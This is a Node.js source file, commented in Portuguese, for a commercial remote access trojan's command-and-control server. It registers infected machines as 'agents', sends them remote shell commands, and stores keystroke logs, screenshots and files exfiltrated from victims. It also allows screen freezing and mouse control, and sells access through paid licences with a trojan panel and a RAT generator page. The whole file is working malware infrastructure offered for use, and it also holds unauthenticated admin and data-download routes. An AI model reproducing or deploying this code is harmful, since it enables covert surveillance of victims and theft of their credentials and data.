const express = require("express");
const Database = require("better-sqlite3");
const bcrypt = require("bcrypt");
const cors = require("cors");
const WebSocket = require("ws");
const http = require("http");
const path = require("path");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// MIDDLEWARES
// ============================================================
app.use(cors());
app.use(express.json({ limit: "100mb" }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

// ============================================================
// SERVIDOR HTTP + WEBSOCKET
// ============================================================
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ============================================================
// DATABASE
// ============================================================
const db = new Database("database.db");

// ============================================================
// FUNÇÕES AUXILIARES
// ============================================================
function getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (let name of Object.keys(interfaces)) {
        for (let iface of interfaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                return iface.address;
            }
        }
    }
    return '127.0.0.1';
}

function getPublicIP() {
    return new Promise((resolve) => {
        const https = require('https');
        https.get('https://api.ipify.org', (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => resolve(data || getLocalIP()));
        }).on('error', () => resolve(getLocalIP()));
    });
}

function generateApiKey() {
    return crypto.randomBytes(32).toString('hex');
}

function generateAgentId() {
    return 'agt_' + crypto.randomBytes(8).toString('hex') + '_' + Date.now();
}

// ============================================================
// INICIAR TABELAS DO BANCO DE DADOS
// ============================================================

// Tabela de usuários
db.prepare(`
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    email TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    is_admin INTEGER DEFAULT 0,
    is_paid INTEGER DEFAULT 0,
    expires_at INTEGER,
    api_key TEXT,
    created_at INTEGER DEFAULT (strftime('%s', 'now'))
)
`).run();

// Tabela de agentes
db.prepare(`
CREATE TABLE IF NOT EXISTS agents (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    agent_id TEXT UNIQUE NOT NULL,
    hostname TEXT,
    os TEXT,
    ip TEXT,
    country TEXT,
    last_seen INTEGER,
    first_seen INTEGER,
    status TEXT DEFAULT 'online',
    frozen INTEGER DEFAULT 0,
    controlled INTEGER DEFAULT 0,
    version TEXT DEFAULT '1.0',
    FOREIGN KEY (user_id) REFERENCES users(id)
)
`).run();

// Tabela de comandos
db.prepare(`
CREATE TABLE IF NOT EXISTS commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT NOT NULL,
    command TEXT NOT NULL,
    result TEXT,
    status TEXT DEFAULT 'pending',
    created_at INTEGER DEFAULT (strftime('%s', 'now')),
    executed_at INTEGER
)
`).run();

// Tabela de keylogs
db.prepare(`
CREATE TABLE IF NOT EXISTS keylogs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT NOT NULL,
    data TEXT NOT NULL,
    created_at INTEGER DEFAULT (strftime('%s', 'now'))
)
`).run();

// Tabela de screenshots
db.prepare(`
CREATE TABLE IF NOT EXISTS screenshots (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT NOT NULL,
    image_data TEXT,
    created_at INTEGER DEFAULT (strftime('%s', 'now'))
)
`).run();

// Tabela de arquivos
db.prepare(`
CREATE TABLE IF NOT EXISTS files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT NOT NULL,
    file_name TEXT,
    file_data TEXT,
    file_size INTEGER,
    created_at INTEGER DEFAULT (strftime('%s', 'now'))
)
`).run();

// Tabela de eventos do mouse
db.prepare(`
CREATE TABLE IF NOT EXISTS mouse_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT NOT NULL,
    event_type TEXT,
    x REAL,
    y REAL,
    created_at INTEGER DEFAULT (strftime('%s', 'now'))
)
`).run();

// Tabela de histórico de conexões
db.prepare(`
CREATE TABLE IF NOT EXISTS connection_history (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_id TEXT NOT NULL,
    action TEXT,
    ip TEXT,
    created_at INTEGER DEFAULT (strftime('%s', 'now'))
)
`).run();

// ============================================================
// WEBSOCKET CONNECTIONS MANAGEMENT
// ============================================================
const agents = new Map();
const userAgents = new Map();
const pendingCommands = new Map();

// ============================================================
// WEBSOCKET SERVER
// ============================================================
wss.on("connection", (ws, req) => {
    console.log(`🟢 Nova conexão WebSocket de ${req.socket.remoteAddress}`);
    let authenticated = false;
    let currentAgentId = null;
    let currentUserId = null;
    let heartbeatInterval = null;
    
    ws.on("message", async (data) => {
        try {
            const message = JSON.parse(data.toString());
            
            // ====================================================
            // AUTENTICAÇÃO DO AGENT
            // ====================================================
            if (message.type === "auth_agent") {
                const { agent_id, api_key, hostname, os, ip, version } = message;
                
                const user = db.prepare(`
                    SELECT id, is_paid, expires_at, is_admin, username
                    FROM users 
                    WHERE api_key = ? AND (is_paid = 1 OR is_admin = 1)
                `).get(api_key);
                
                if (!user) {
                    ws.send(JSON.stringify({ type: "auth_failed", reason: "Invalid API key" }));
                    ws.close();
                    return;
                }
                
                if (user.expires_at && user.expires_at < Date.now() && user.is_admin !== 1) {
                    ws.send(JSON.stringify({ type: "auth_failed", reason: "License expired" }));
                    ws.close();
                    return;
                }
                
                authenticated = true;
                currentAgentId = agent_id;
                currentUserId = user.id;
                
                // Registrar ou atualizar agente
                const existing = db.prepare("SELECT * FROM agents WHERE agent_id = ?").get(agent_id);
                
                if (!existing) {
                    db.prepare(`
                        INSERT INTO agents (user_id, agent_id, hostname, os, ip, first_seen, last_seen, frozen, controlled, version)
                        VALUES (?, ?, ?, ?, ?, ?, ?, 0, 0, ?)
                    `).run(user.id, agent_id, hostname, os, ip, Date.now(), Date.now(), version || '1.0');
                    
                    db.prepare(`
                        INSERT INTO connection_history (agent_id, action, ip)
                        VALUES (?, ?, ?)
                    `).run(agent_id, 'connected', ip);
                } else {
                    db.prepare(`
                        UPDATE agents SET last_seen = ?, status = 'online', ip = ?, hostname = ?, os = ?, version = ?
                        WHERE agent_id = ?
                    `).run(Date.now(), ip, hostname, os, version || '1.0', agent_id);
                }
                
                agents.set(agent_id, { ws, userId: user.id, lastSeen: Date.now() });
                
                if (!userAgents.has(user.id)) {
                    userAgents.set(user.id, new Set());
                }
                userAgents.get(user.id).add(agent_id);
                
                ws.send(JSON.stringify({ 
                    type: "auth_success", 
                    message: "Connected to C2 Server",
                    server_time: Date.now()
                }));
                
                // Enviar comandos pendentes
                const pendingCmds = db.prepare(`
                    SELECT id, command FROM commands 
                    WHERE agent_id = ? AND status = 'pending'
                    ORDER BY created_at ASC
                `).all(agent_id);
                
                for (const cmd of pendingCmds) {
                    ws.send(JSON.stringify({ type: "command", id: cmd.id, command: cmd.command }));
                    pendingCommands.set(cmd.id, { agent_id: agent_id, sent_at: Date.now() });
                }
                
                console.log(`✅ Agent conectado: ${agent_id} (Usuário: ${user.username})`);
                
                // Broadcast para o painel
                broadcastToUser(currentUserId, {
                    type: "agent_connected",
                    agent_id: agent_id,
                    hostname: hostname,
                    os: os,
                    ip: ip
                });
            }
            
            // ====================================================
            // RESPOSTA DE COMANDO
            // ====================================================
            else if (message.type === "command_result" && authenticated) {
                const { command_id, result, error } = message;
                
                db.prepare(`
                    UPDATE commands 
                    SET result = ?, status = 'completed', executed_at = ?
                    WHERE id = ?
                `).run(error || result, Date.now(), command_id);
                
                pendingCommands.delete(command_id);
                
                broadcastToUser(currentUserId, {
                    type: "command_completed",
                    agent_id: currentAgentId,
                    command_id: command_id,
                    result: result,
                    error: error
                });
                
                console.log(`📝 Comando ${command_id} concluído no agent ${currentAgentId}`);
            }
            
            // ====================================================
            // KEYLOG DATA
            // ====================================================
            else if (message.type === "keylog_data" && authenticated) {
                const { data } = message;
                
                db.prepare(`
                    INSERT INTO keylogs (agent_id, data, created_at)
                    VALUES (?, ?, ?)
                `).run(currentAgentId, data, Date.now());
                
                broadcastToUser(currentUserId, {
                    type: "new_keylog",
                    agent_id: currentAgentId,
                    data: data,
                    timestamp: Date.now()
                });
                
                console.log(`⌨️ Keylog recebido de ${currentAgentId}: ${data.length} caracteres`);
            }
            
            // ====================================================
            // SCREENSHOT DATA
            // ====================================================
            else if (message.type === "screenshot_data" && authenticated) {
                const { image_data } = message;
                
                db.prepare(`
                    INSERT INTO screenshots (agent_id, image_data, created_at)
                    VALUES (?, ?, ?)
                `).run(currentAgentId, image_data, Date.now());
                
                broadcastToUser(currentUserId, {
                    type: "new_screenshot",
                    agent_id: currentAgentId,
                    image_data: image_data,
                    timestamp: Date.now()
                });
                
                console.log(`📸 Screenshot recebido de ${currentAgentId}`);
            }
            
            // ====================================================
            // FILE DATA
            // ====================================================
            else if (message.type === "file_data" && authenticated) {
                const { file_name, file_data, file_size } = message;
                
                db.prepare(`
                    INSERT INTO files (agent_id, file_name, file_data, file_size, created_at)
                    VALUES (?, ?, ?, ?, ?)
                `).run(currentAgentId, file_name, file_data, file_size || 0, Date.now());
                
                broadcastToUser(currentUserId, {
                    type: "file_received",
                    agent_id: currentAgentId,
                    file_name: file_name,
                    file_size: file_size
                });
                
                console.log(`📁 Arquivo recebido: ${file_name} de ${currentAgentId}`);
            }
            
            // ====================================================
            // SYSTEM INFO
            // ====================================================
            else if (message.type === "system_info" && authenticated) {
                const { cpu, memory, disk, processes } = message;
                
                db.prepare(`
                    UPDATE agents SET 
                        cpu_info = ?, 
                        memory_info = ?, 
                        disk_info = ?,
                        process_count = ?
                    WHERE agent_id = ?
                `).run(
                    JSON.stringify(cpu), 
                    JSON.stringify(memory), 
                    JSON.stringify(disk), 
                    processes ? processes.length : 0,
                    currentAgentId
                );
                
                broadcastToUser(currentUserId, {
                    type: "system_update",
                    agent_id: currentAgentId,
                    cpu: cpu,
                    memory: memory,
                    disk: disk
                });
            }
            
            // ====================================================
            // MOUSE EVENT
            // ====================================================
            else if (message.type === "mouse_event" && authenticated) {
                const { event_type, x, y } = message;
                
                db.prepare(`
                    INSERT INTO mouse_events (agent_id, event_type, x, y, created_at)
                    VALUES (?, ?, ?, ?, ?)
                `).run(currentAgentId, event_type, x, y, Date.now());
            }
            
            // ====================================================
            // HEARTBEAT
            // ====================================================
            else if (message.type === "heartbeat" && authenticated) {
                db.prepare("UPDATE agents SET last_seen = ? WHERE agent_id = ?").run(Date.now(), currentAgentId);
                ws.send(JSON.stringify({ type: "heartbeat_ack", time: Date.now() }));
                
                // Atualizar status no mapa
                const agentData = agents.get(currentAgentId);
                if (agentData) {
                    agentData.lastSeen = Date.now();
                    agents.set(currentAgentId, agentData);
                }
            }
            
            // ====================================================
            // PING para manter conexão
            // ====================================================
            else if (message.type === "ping") {
                ws.send(JSON.stringify({ type: "pong", time: Date.now() }));
            }
            
        } catch (err) {
            console.error("WebSocket error:", err);
            ws.send(JSON.stringify({ type: "error", message: "Invalid message format" }));
        }
    });
    
    // Heartbeat para verificar conexão
    heartbeatInterval = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN && authenticated) {
            ws.send(JSON.stringify({ type: "ping" }));
        }
    }, 30000);
    
    ws.on("close", () => {
        if (heartbeatInterval) clearInterval(heartbeatInterval);
        
        if (currentAgentId) {
            console.log(`🔴 Agent desconectado: ${currentAgentId}`);
            db.prepare("UPDATE agents SET status = 'offline' WHERE agent_id = ?").run(currentAgentId);
            db.prepare(`
                INSERT INTO connection_history (agent_id, action, ip)
                VALUES (?, ?, ?)
            `).run(currentAgentId, 'disconnected', null);
            
            agents.delete(currentAgentId);
            
            if (currentUserId && userAgents.has(currentUserId)) {
                userAgents.get(currentUserId).delete(currentAgentId);
                
                broadcastToUser(currentUserId, {
                    type: "agent_disconnected",
                    agent_id: currentAgentId
                });
            }
        }
    });
});

// ============================================================
// FUNÇÃO PARA BROADCAST PARA USUÁRIO
// ============================================================
function broadcastToUser(userId, message) {
    if (!userAgents.has(userId)) return;
    
    for (const agentId of userAgents.get(userId)) {
        const agentData = agents.get(agentId);
        if (agentData && agentData.ws && agentData.ws.readyState === WebSocket.OPEN) {
            agentData.ws.send(JSON.stringify(message));
        }
    }
}

// ============================================================
// API ROUTES
// ============================================================

// ==================== IP DETECTION ====================
app.get("/api/myip", async (req, res) => {
    const localIP = getLocalIP();
    const publicIP = await getPublicIP();
    res.json({ 
        localIP, 
        publicIP,
        timestamp: Date.now()
    });
});

// ==================== USER MANAGEMENT ====================
app.post("/api/generate_key", async (req, res) => {
    const { email, password } = req.body;
    
    if (!email || !password) {
        return res.status(400).json({ error: "Email e senha obrigatórios" });
    }
    
    const user = db.prepare("SELECT * FROM users WHERE email = ?").get(email);
    if (!user) return res.status(404).json({ error: "Usuário não encontrado" });
    
    const valid = await bcrypt.compare(password, user.password);
    if (!valid) return res.status(401).json({ error: "Senha incorreta" });
    
    const api_key = generateApiKey();
    db.prepare("UPDATE users SET api_key = ? WHERE id = ?").run(api_key, user.id);
    
    res.json({ 
        success: true, 
        api_key,
        message: "API Key gerada com sucesso!"
    });
});

// ==================== AGENTS MANAGEMENT ====================
app.get("/api/agents", (req, res) => {
    const { email, api_key } = req.headers;
    
    if (!email || !api_key) {
        return res.status(401).json({ error: "Credenciais não fornecidas" });
    }
    
    const user = db.prepare("SELECT id FROM users WHERE email = ? AND api_key = ?").get(email, api_key);
    if (!user) return res.status(401).json({ error: "Não autorizado" });
    
    const agentsList = db.prepare(`
        SELECT agent_id, hostname, os, ip, last_seen, status, frozen, controlled, version, first_seen
        FROM agents 
        WHERE user_id = ?
        ORDER BY last_seen DESC
    `).all(user.id);
    
    // Calcular tempo online
    const now = Date.now();
    for (const agent of agentsList) {
        agent.last_seen_human = agent.last_seen ? formatTimeAgo(agent.last_seen) : 'Nunca';
        agent.online_time = agent.status === 'online' ? formatDuration(now - agent.last_seen) : null;
    }
    
    res.json(agentsList);
});

app.get("/api/agents/:agent_id", (req, res) => {
    const { agent_id } = req.params;
    const { email, api_key } = req.headers;
    
    const user = db.prepare("SELECT id FROM users WHERE email = ? AND api_key = ?").get(email, api_key);
    if (!user) return res.status(401).json({ error: "Não autorizado" });
    
    const agent = db.prepare(`
        SELECT * FROM agents WHERE agent_id = ? AND user_id = ?
    `).get(agent_id, user.id);
    
    if (!agent) return res.status(404).json({ error: "Agente não encontrado" });
    
    // Adicionar estatísticas
    const commandCount = db.prepare("SELECT COUNT(*) as total FROM commands WHERE agent_id = ?").get(agent_id);
    const screenshotCount = db.prepare("SELECT COUNT(*) as total FROM screenshots WHERE agent_id = ?").get(agent_id);
    const keylogCount = db.prepare("SELECT COUNT(*) as total FROM keylogs WHERE agent_id = ?").get(agent_id);
    
    agent.stats = {
        commands: commandCount.total,
        screenshots: screenshotCount.total,
        keylogs: keylogCount.total
    };
    
    res.json(agent);
});

// ==================== COMMANDS ====================
app.post("/api/send_command", (req, res) => {
    const { email, api_key, agent_id, command } = req.body;
    
    if (!email || !api_key || !agent_id || !command) {
        return res.status(400).json({ error: "Dados incompletos" });
    }
    
    const user = db.prepare("SELECT id FROM users WHERE email = ? AND api_key = ?").get(email, api_key);
    if (!user) return res.status(401).json({ error: "Não autorizado" });
    
    const agent = db.prepare("SELECT * FROM agents WHERE agent_id = ? AND user_id = ?").get(agent_id, user.id);
    if (!agent) return res.status(404).json({ error: "Agente não encontrado" });
    
    const result = db.prepare(`
        INSERT INTO commands (agent_id, command, created_at)
        VALUES (?, ?, ?)
    `).run(agent_id, command, Date.now());
    
    const agentData = agents.get(agent_id);
    if (agentData && agentData.ws && agentData.ws.readyState === WebSocket.OPEN) {
        agentData.ws.send(JSON.stringify({ 
            type: "command", 
            id: result.lastInsertRowid, 
            command: command 
        }));
        res.json({ 
            id: result.lastInsertRowid, 
            status: "sent",
            delivered: true
        });
    } else {
        res.json({ 
            id: result.lastInsertRowid, 
            status: "queued",
            delivered: false,
            message: "Agente offline, comando na fila"
        });
    }
});

app.get("/api/get_commands", (req, res) => {
    const { agent_id, limit = 50 } = req.query;
    
    const commands = db.prepare(`
        SELECT id, command, result, status, created_at, executed_at
        FROM commands 
        WHERE agent_id = ?
        ORDER BY created_at DESC 
        LIMIT ?
    `).all(agent_id, limit);
    
    // Formatar datas
    for (const cmd of commands) {
        cmd.created_at_human = cmd.created_at ? new Date(cmd.created_at).toLocaleString() : null;
        cmd.executed_at_human = cmd.executed_at ? new Date(cmd.executed_at).toLocaleString() : null;
    }
    
    res.json(commands);
});

// ==================== FREEZE SCREEN ====================
app.post("/api/freeze_screen", (req, res) => {
    const { email, api_key, agent_id, frozen } = req.body;
    
    const user = db.prepare("SELECT id FROM users WHERE email = ? AND api_key = ?").get(email, api_key);
    if (!user) return res.status(401).json({ error: "Não autorizado" });
    
    db.prepare("UPDATE agents SET frozen = ? WHERE agent_id = ?").run(frozen ? 1 : 0, agent_id);
    
    const agentData = agents.get(agent_id);
    if (agentData && agentData.ws && agentData.ws.readyState === WebSocket.OPEN) {
        agentData.ws.send(JSON.stringify({ type: "freeze_screen", frozen: frozen }));
    }
    
    res.json({ 
        success: true, 
        frozen: frozen,
        message: frozen ? "Tela congelada" : "Tela descongelada"
    });
});

// ==================== CONTROL MODE ====================
app.post("/api/set_control", (req, res) => {
    const { email, api_key, agent_id, controlled } = req.body;
    
    const user = db.prepare("SELECT id FROM users WHERE email = ? AND api_key = ?").get(email, api_key);
    if (!user) return res.status(401).json({ error: "Não autorizado" });
    
    db.prepare("UPDATE agents SET controlled = ? WHERE agent_id = ?").run(controlled ? 1 : 0, agent_id);
    
    const agentData = agents.get(agent_id);
    if (agentData && agentData.ws && agentData.ws.readyState === WebSocket.OPEN) {
        agentData.ws.send(JSON.stringify({ type: "set_control", controlled: controlled }));
    }
    
    res.json({ 
        success: true, 
        controlled: controlled,
        message: controlled ? "Modo controle ativado" : "Modo controle desativado"
    });
});

// ==================== MOUSE CONTROL ====================
app.post("/api/send_mouse", (req, res) => {
    const { email, api_key, agent_id, x, y, button } = req.body;
    
    const user = db.prepare("SELECT id FROM users WHERE email = ? AND api_key = ?").get(email, api_key);
    if (!user) return res.status(401).json({ error: "Não autorizado" });
    
    const agentData = agents.get(agent_id);
    if (agentData && agentData.ws && agentData.ws.readyState === WebSocket.OPEN) {
        agentData.ws.send(JSON.stringify({ 
            type: "mouse_control", 
            x: x, 
            y: y, 
            button: button || 'move' 
        }));
        res.json({ success: true });
    } else {
        res.status(404).json({ error: "Agente offline" });
    }
});

// ==================== KEYLOGS ====================
app.get("/api/get_keylogs", (req, res) => {
    const { agent_id, limit = 100 } = req.query;
    
    const keylogs = db.prepare(`
        SELECT data, created_at 
        FROM keylogs 
        WHERE agent_id = ? 
        ORDER BY created_at DESC 
        LIMIT ?
    `).all(agent_id, limit);
    
    for (const log of keylogs) {
        log.created_at_human = log.created_at ? new Date(log.created_at).toLocaleString() : null;
    }
    
    res.json(keylogs);
});

app.delete("/api/clear_keylogs", (req, res) => {
    const { agent_id, email, api_key } = req.body;
    
    const user = db.prepare("SELECT id FROM users WHERE email = ? AND api_key = ?").get(email, api_key);
    if (!user) return res.status(401).json({ error: "Não autorizado" });
    
    db.prepare("DELETE FROM keylogs WHERE agent_id = ?").run(agent_id);
    res.json({ success: true, message: "Keylogs apagados" });
});

// ==================== SCREENSHOTS ====================
app.get("/api/get_screenshots", (req, res) => {
    const { agent_id, limit = 10 } = req.query;
    
    const screenshots = db.prepare(`
        SELECT id, image_data, created_at 
        FROM screenshots 
        WHERE agent_id = ? 
        ORDER BY created_at DESC 
        LIMIT ?
    `).all(agent_id, limit);
    
    for (const shot of screenshots) {
        shot.created_at_human = shot.created_at ? new Date(shot.created_at).toLocaleString() : null;
    }
    
    res.json(screenshots);
});

// ==================== FILES ====================
app.get("/api/get_files", (req, res) => {
    const { agent_id, limit = 50 } = req.query;
    
    const files = db.prepare(`
        SELECT id, file_name, file_size, created_at 
        FROM files 
        WHERE agent_id = ? 
        ORDER BY created_at DESC 
        LIMIT ?
    `).all(agent_id, limit);
    
    for (const file of files) {
        file.created_at_human = file.created_at ? new Date(file.created_at).toLocaleString() : null;
    }
    
    res.json(files);
});

app.get("/api/download_file/:id", (req, res) => {
    const { id } = req.params;
    
    const file = db.prepare("SELECT file_name, file_data FROM files WHERE id = ?").get(id);
    if (!file) return res.status(404).json({ error: "Arquivo não encontrado" });
    
    res.setHeader('Content-Disposition', `attachment; filename="${file.file_name}"`);
    res.setHeader('Content-Type', 'application/octet-stream');
    res.send(Buffer.from(file.file_data, 'base64'));
});

// ==================== STATISTICS ====================
app.get("/api/stats", (req, res) => {
    const { email, api_key } = req.headers;
    
    const user = db.prepare("SELECT id FROM users WHERE email = ? AND api_key = ?").get(email, api_key);
    if (!user) return res.status(401).json({ error: "Não autorizado" });
    
    const totalAgents = db.prepare("SELECT COUNT(*) as total FROM agents WHERE user_id = ?").get(user.id);
    const onlineAgents = db.prepare("SELECT COUNT(*) as total FROM agents WHERE user_id = ? AND status = 'online'").get(user.id);
    const totalCommands = db.prepare("SELECT COUNT(*) as total FROM commands WHERE agent_id IN (SELECT agent_id FROM agents WHERE user_id = ?)").get(user.id);
    const totalScreenshots = db.prepare("SELECT COUNT(*) as total FROM screenshots WHERE agent_id IN (SELECT agent_id FROM agents WHERE user_id = ?)").get(user.id);
    const totalKeylogs = db.prepare("SELECT COUNT(*) as total FROM keylogs WHERE agent_id IN (SELECT agent_id FROM agents WHERE user_id = ?)").get(user.id);
    
    res.json({
        agents: {
            total: totalAgents.total,
            online: onlineAgents.total
        },
        commands: totalCommands.total,
        screenshots: totalScreenshots.total,
        keylogs: totalKeylogs.total
    });
});

// ==================== AUTH ROUTES ====================
app.post("/register", async (req, res) => {
    const { username, email, password } = req.body;
    
    if (!username || !email || !password) {
        return res.status(400).json({ error: "Preencha todos os campos" });
    }
    
    if (password.length < 6) {
        return res.status(400).json({ error: "A senha deve ter no mínimo 6 caracteres" });
    }
    
    try {
        const hash = await bcrypt.hash(password, 10);
        const api_key = generateApiKey();
        
        const result = db.prepare(`
            INSERT INTO users (username, email, password, api_key)
            VALUES (?, ?, ?, ?)
        `).run(username, email, hash, api_key);
        
        res.json({ 
            success: true,
            message: "Conta criada com sucesso!", 
            userId: result.lastInsertRowid,
            api_key: api_key
        });
    } catch (err) {
        if (err.code === "SQLITE_CONSTRAINT_UNIQUE") {
            return res.status(400).json({ error: "Email já cadastrado" });
        }
        console.error(err);
        res.status(500).json({ error: "Erro no servidor" });
    }
});

app.post("/login", async (req, res) => {
    const { email, password } = req.body;
    
    if (!email || !password) {
        return res.status(400).json({ error: "Preencha todos os campos" });
    }
    
    try {
        const user = db.prepare(`
            SELECT * FROM users WHERE email = ? OR username = ?
        `).get(email, email);
        
        if (!user) {
            return res.status(400).json({ error: "Usuário não encontrado" });
        }
        
        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) {
            return res.status(400).json({ error: "Senha incorreta" });
        }
        
        const now = Date.now();
        const isAdmin = user.is_admin === 1;
        const isActivePaid = user.is_paid === 1 && (!user.expires_at || user.expires_at > now);
        
        let redirect = "dashboard.html";
        if (isAdmin) {
            redirect = "admin.html";
        } else if (isActivePaid) {
            redirect = "trojan_panel.html";
        }
        
        // Atualizar último login
        db.prepare("UPDATE users SET last_login = ? WHERE id = ?").run(now, user.id);
        
        res.json({
            success: true,
            message: "Login realizado com sucesso!",
            user: {
                id: user.id,
                username: user.username,
                email: user.email,
                is_admin: user.is_admin,
                is_paid: user.is_paid,
                api_key: user.api_key,
                expires_at: user.expires_at
            },
            redirect
        });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Erro no servidor" });
    }
});

// ==================== ADMIN ROUTES ====================
app.get("/admin/make", (req, res) => {
    const { email } = req.query;
    if (!email) return res.status(400).send("Email required");
    
    const result = db.prepare("UPDATE users SET is_admin = 1 WHERE email = ?").run(email);
    if (result.changes > 0) {
        res.send(`✅ ${email} agora é administrador!`);
    } else {
        res.send(`❌ Usuário ${email} não encontrado`);
    }
});

app.post("/admin/grant", (req, res) => {
    const { email, plan } = req.body;
    
    if (!email || !plan) {
        return res.status(400).json({ error: "Email e plano obrigatórios" });
    }
    
    let durationDays = plan === "monthly" ? 30 : plan === "yearly" ? 365 : 0;
    if (!durationDays) {
        return res.status(400).json({ error: "Plano inválido. Use 'monthly' ou 'yearly'" });
    }
    
    const expires_at = Date.now() + (durationDays * 24 * 60 * 60 * 1000);
    
    const result = db.prepare(`
        UPDATE users SET is_paid = 1, expires_at = ? WHERE email = ?
    `).run(expires_at, email);
    
    if (result.changes > 0) {
        res.json({ 
            success: true, 
            message: `Acesso liberado para ${email} até ${new Date(expires_at).toLocaleDateString()}`
        });
    } else {
        res.status(404).json({ error: "Usuário não encontrado" });
    }
});

app.post("/admin/revoke", (req, res) => {
    const { email } = req.body;
    
    if (!email) {
        return res.status(400).json({ error: "Email obrigatório" });
    }
    
    const result = db.prepare(`
        UPDATE users SET is_paid = 0, expires_at = NULL WHERE email = ?
    `).run(email);
    
    if (result.changes > 0) {
        res.json({ success: true, message: `Acesso removido para ${email}` });
    } else {
        res.status(404).json({ error: "Usuário não encontrado" });
    }
});

app.get("/admin/users", (req, res) => {
    const users = db.prepare(`
        SELECT id, username, email, is_paid, is_admin, expires_at, created_at
        FROM users
        ORDER BY created_at DESC
    `).all();
    
    // Formatar datas
    for (const user of users) {
        user.created_at_human = user.created_at ? new Date(user.created_at * 1000).toLocaleString() : null;
        user.expires_at_human = user.expires_at ? new Date(user.expires_at).toLocaleString() : null;
        user.time_left = user.expires_at ? formatDuration(user.expires_at - Date.now()) : null;
    }
    
    res.json(users);
});

// ==================== FUNÇÕES AUXILIARES ====================
function formatTimeAgo(timestamp) {
    const seconds = Math.floor((Date.now() - timestamp) / 1000);
    
    if (seconds < 60) return `${seconds} segundos atrás`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes} minutos atrás`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours} horas atrás`;
    const days = Math.floor(hours / 24);
    return `${days} dias atrás`;
}

function formatDuration(ms) {
    if (ms < 0) return "0s";
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);
    const days = Math.floor(hours / 24);
    
    if (days > 0) return `${days}d ${hours % 24}h`;
    if (hours > 0) return `${hours}h ${minutes % 60}m`;
    if (minutes > 0) return `${minutes}m ${seconds % 60}s`;
    return `${seconds}s`;
}

// ==================== SERVIDOR ESTÁTICO ====================
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.get("/trojan_panel.html", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "trojan_panel.html"));
});

app.get("/trojan_generator.html", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "trojan_generator.html"));
});

app.get("/admin.html", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "admin.html"));
});

app.get("/dashboard.html", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "dashboard.html"));
});

app.get("/signup.html", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "signup.html"));
});

// ==================== HEALTH CHECK ====================
app.get("/health", (req, res) => {
    res.json({ 
        status: "online", 
        uptime: process.uptime(),
        timestamp: Date.now(),
        agents: agents.size,
        users: db.prepare("SELECT COUNT(*) as total FROM users").get().total
    });
});

// ==================== START SERVER ====================
server.listen(PORT, async () => {
    const localIP = getLocalIP();
    const publicIP = await getPublicIP();
    
    console.log(`\n╔════════════════════════════════════════════════════════════════════╗`);
    console.log(`║                    🔥 C2 SERVER ULTIMATE INICIADO 🔥                 ║`);
    console.log(`╠════════════════════════════════════════════════════════════════════╣`);
    console.log(`║ 📡 WebSocket:    ws://${localIP}:${PORT}                                  ║`);
    console.log(`║ 🌐 Local:        http://${localIP}:${PORT}                                    ║`);
    console.log(`║ 🌍 Público:      http://${publicIP}:${PORT}                                  ║`);
    console.log(`║ 📁 Diretório:    ${__dirname}                                  ║`);
    console.log(`║ 🗄️  Banco de dados: database.db                                      ║`);
    console.log(`╠════════════════════════════════════════════════════════════════════╣`);
    console.log(`║ ✅ Painel C2:    http://${publicIP}:${PORT}/trojan_panel.html               ║`);
    console.log(`║ ✅ Gerador RAT:  http://${publicIP}:${PORT}/trojan_generator.html           ║`);
    console.log(`║ ✅ Admin Panel:  http://${publicIP}:${PORT}/admin.html                       ║`);
    console.log(`╚════════════════════════════════════════════════════════════════════╝`);
});